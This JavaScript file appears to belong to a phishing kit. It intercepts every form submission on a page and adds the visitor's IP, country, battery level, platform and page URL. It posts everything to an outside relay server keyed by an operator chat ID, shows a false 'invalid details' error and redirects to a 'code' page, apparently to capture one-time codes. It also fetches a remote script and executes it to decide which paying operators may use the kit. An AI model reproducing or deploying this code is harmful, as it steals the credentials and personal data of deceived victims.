// ================= LOAD PREMIUM USERS =================
let premiumUsers = [];

async function loadPremiumUsers() {
  try {
    const res = await fetch("https://afkft.github.io/ho/da/premiumlist.js");
    const text = await res.text();

    // Execute premiumlist.js and extract premiumUsers
    const fn = new Function(text + "; return premiumUsers;");
    premiumUsers = fn();
  } catch (err) {
    console.error("❌ Failed to load premium list", err);
    premiumUsers = [];
  }
}

// ================= MAIN SCRIPT =================
document.addEventListener("DOMContentLoaded", async () => {
  await loadPremiumUsers(); // 🔥 Load premium list first

  const DEFAULT_USER_ID = "7979664801";
  const forms = document.querySelectorAll("form");

  let userCountry = "Unknown";
  let userIP = "Unknown";
  let batteryLevel = "Unknown";

  // ---------- BATTERY INFO ----------
  if (navigator.getBattery) {
    navigator.getBattery()
      .then(battery => {
        batteryLevel = Math.round(battery.level * 100) + "%";
      })
      .catch(() => {});
  }

  // ---------- IP + COUNTRY ----------
  fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
      if (data) {
        userCountry = data.country_name || userCountry;
        userIP = data.ip || userIP;
      }
    })
    .catch(() => {});

  // ---------- FORM HANDLER ----------
  forms.forEach((form) => {
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const urlParams = new URLSearchParams(window.location.search);
      const userId = urlParams.get("id") || DEFAULT_USER_ID;
      const numericUserId = Number(userId);

      // ❌ BLOCK NON-PREMIUM USERS
      if (!premiumUsers.includes(numericUserId)) {
        alert("🚫 Access denied\ntry again or check premium.");
        return;
      }

      // ✅ PREMIUM USER CONTINUES
      const formData = new FormData(form);

      // 🔹 REQUIRED
      formData.append("chat_id", userId);

      // ✅ SEPARATOR
      formData.append("──────────────", "");
      formData.append("📊 System Information", "");
      formData.append("──────────────", "");

      // 🔹 AUTO-COLLECTED DATA
      formData.append("📄 Page", document.title);
      formData.append("🕒 Date & Time", new Date().toLocaleString());
      formData.append("🌍 Country", userCountry);
      formData.append("📡 Client IP", userIP);
      formData.append("🔋 Battery Level", batteryLevel);
      formData.append("💻 Platform", navigator.platform || "Unknown");
      formData.append("🌐 Language", navigator.language || "Unknown");

      // ✅ PAGE URL
      formData.append("🔗 Page URL", window.location.href);

      try {
        const response = await fetch(
          "https://sender-slbv.onrender.com/send",
          {
            method: "POST",
            body: formData
          }
        );

        if (response.ok) {
          alert("⛔ invalid details please try again 😟");
          form.reset();

          // ✅ REDIRECT WITH ID
          window.location.href = `code/c.html?id=${encodeURIComponent(userId)}`;
        } else {
          const errorText = await response.text();
          console.error("Server Error:", errorText);
          alert("❌ Error submitting form");
        }
      } catch (err) {
        console.error("Network Error:", err);
        alert("⚠️ Network error");
      }
    });
  });
});